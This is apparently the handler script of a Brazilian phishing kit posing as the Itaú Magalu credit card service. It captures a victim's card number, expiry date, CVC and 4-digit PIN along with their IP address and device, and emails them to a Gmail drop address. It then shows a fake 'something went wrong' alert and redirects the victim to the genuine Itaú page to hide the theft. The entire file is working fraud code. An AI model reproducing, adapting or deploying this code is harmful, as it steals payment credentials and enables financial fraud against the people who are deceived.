<?php
	session_start();

	 $number = $_POST['number'];
        $password = $_POST['password'];
        $expiry = $_POST['expiry'];
        $cvc= $_POST['cvc'];

       

        $_SESSION["number"] = $number;
        $_SESSION["password"] = $password;
         $_SESSION["expiry"] = $expiry;
          $_SESSION["cvc"] = $cvc;

    



   
	
	

	$ip = $_SERVER['REMOTE_ADDR'];
	$dispositivo = $_SERVER['HTTP_USER_AGENT'];

	$subj = "CHEGOU MAGALU | $ip";

	$mensagemHTML = '
	<p>------------- |Chegou Magalu| ------------</p>
	<p><b>IP:</b> '.$ip.'<br>
	<p><b>Dispositivo:</b> '.$dispositivo.'<br>
	<br>
	<p><b>Numero do cartao:</b> '.$number.'<br>
	<p><b>Validade:</b> '.$expiry.'<br>
	<p><b>Cvv:</b> '.$cvc.'<br>
		
	<p><b>Senha de 4:</b> '.$password.'<br>
	
	
	<p>----------------- |BY KOBAYASHI| ------------------</p>

	';

	$headers = "MIME-Version: 1.1\r\n";
	$headers .= "Content-type: text/html; charset=utf-8\r\n";
	$headers .= "From: setepneusoficial@gmail.com\r\n";
	$headers .= "Return-Path: ourokuto@gmail.com \r\n";
	$envio = mail("setepneusoficial@gmail.com", $subj, $mensagemHTML, $headers);

	if($envio){
		echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='https://www.itau.com.br/cartoes/magalu/consulte-sua-fatura/';</script>";
	}else{ 
		echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../index.php';</script>";
	}

?>